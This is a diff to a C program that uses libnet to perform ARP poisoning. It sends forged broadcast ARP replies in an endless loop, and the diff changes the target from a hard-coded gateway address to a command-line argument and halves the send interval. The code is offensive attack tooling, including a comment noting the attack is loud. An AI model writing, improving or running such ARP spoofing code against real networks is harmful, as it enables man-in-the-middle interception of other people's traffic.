@@ -8,6 +8,7 @@
 libnet_t *l;
 char errbuf[LIBNET_ERRBUF_SIZE];
 libnet_ptag_t arp_id, eth_id;
+char *target;
 
 void handleargs(int argc, char const *argv[]){
   struct sockaddr_in sa;
@@ -15,6 +16,7 @@ void handleargs(int argc, char const *argv[]){
     printf("Error: Invalid IP\n");
     exit(-1);
   }
+  target = (char *)argv[1];
 }
 
 void checkroot(){
@@ -28,7 +30,7 @@ void arp_poison(libnet_t *l) {
     char mac[19];
     sprintf(mac, "%s", retrieve_system_address("mac"));
     u_char *tha = (u_char *)"\xff\xff\xff\xff\xff\xff"; //loud but idc
-    u_int8_t *tpa = (u_int8_t *)libnet_name2addr4(l,"192.168.1.1", 1);
+    u_int8_t *tpa = (u_int8_t *)libnet_name2addr4(l,target, 1);
     u_int8_t *spa = (u_int8_t *)libnet_get_ipaddr4(l);
     u_char *sha = (u_char *)libnet_get_hwaddr(l);
 
@@ -71,7 +73,7 @@ void arp_poison(libnet_t *l) {
     while (1) {
       printf("%d: %s is at %s > %s\n", libnet_write(l), mac,
                                        libnet_addr2name4((uint32_t)spa, 0), ether_ntoa((struct ether_addr *)tha));
-      sleep(2);
+      sleep(1);
     }
 }
 
